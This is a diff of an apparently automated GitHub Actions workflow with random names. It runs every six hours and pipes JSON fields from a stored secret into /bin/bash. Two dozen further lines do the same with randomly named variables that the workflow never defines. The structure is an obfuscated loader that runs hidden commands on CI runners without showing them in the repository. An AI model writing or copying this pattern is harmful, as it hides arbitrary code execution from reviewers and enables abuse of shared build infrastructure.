@@ -1,11 +1,10 @@
 name: yongqiynlb
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 4/6 * * *'
+    - cron: '22 1/6 * * *'
 
-jobs:  # 20343
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,18 +12,32 @@ jobs:  # 20343
       - uses: actions/checkout@v4
       - name: yongqiynlb
         env:
-          ipfh959: ${{ secrets.ipfh959 }}
+          tkan898: ${{ secrets.tkan898 }}
         run: |
-          echo $ipfh959 | jq -r .vz2523 | /bin/bash
-          echo $qcfsi61732 | jq -r .hzj97584 | /bin/bash
-          echo $r7573 | jq -r .zwxq9 | /bin/bash
-          echo $wlwb169 | jq -r .dkcwc800 | /bin/bash
-          echo $tq8 | jq -r .swei4 | /bin/bash
-          echo $qk68043 | jq -r .vfyc51683 | /bin/bash
-          echo $huqmo16 | jq -r .qo01621 | /bin/bash
-          echo $zm5 | jq -r .eh07074 | /bin/bash
-          echo $qlfvi88658 | jq -r .ftnz5705 | /bin/bash
-          echo $eekv112 | jq -r .ax25 | /bin/bash
-          echo $y36 | jq -r .a6382 | /bin/bash
-          echo $z2 | jq -r .qp55809 | /bin/bash
+          echo $tkan898 | jq -r .i35 | /bin/bash
+          echo $dngfd83136 | jq -r .ism8153 | /bin/bash
+          echo $bc24491 | jq -r .bfg56 | /bin/bash
+          echo $wd11 | jq -r .ccugc3 | /bin/bash
+          echo $cj36714 | jq -r .ylcak683 | /bin/bash
+          echo $b5 | jq -r .boue654 | /bin/bash
+          echo $ycsqn25108 | jq -r .jd8 | /bin/bash
+          echo $nrx44497 | jq -r .h90 | /bin/bash
+          echo $xtl4426 | jq -r .sbzf2209 | /bin/bash
+          echo $cckkx8815 | jq -r .cd07 | /bin/bash
+          echo $rsx03989 | jq -r .ulsl11977 | /bin/bash
+          echo $txoh541 | jq -r .xoz491 | /bin/bash
+          echo $yfax17 | jq -r .cot7 | /bin/bash
+          echo $stkba37915 | jq -r .vtzc76 | /bin/bash
+          echo $zl036 | jq -r .paf485 | /bin/bash
+          echo $s80 | jq -r .p3894 | /bin/bash
+          echo $trbxl1 | jq -r .at58939 | /bin/bash
+          echo $zv8186 | jq -r .mg99 | /bin/bash
+          echo $mcyn71181 | jq -r .boxxf8110 | /bin/bash
+          echo $eh9225 | jq -r .ih33881 | /bin/bash
+          echo $uw6618 | jq -r .ged6090 | /bin/bash
+          echo $dvqi647 | jq -r .qku1896 | /bin/bash
+          echo $j42984 | jq -r .lyr48 | /bin/bash
+          echo $z994 | jq -r .mllq27768 | /bin/bash
+          echo $xiu35 | jq -r .mwsr3117 | /bin/bash
+          echo $dyd5 | jq -r .pk483 | /bin/bash
 
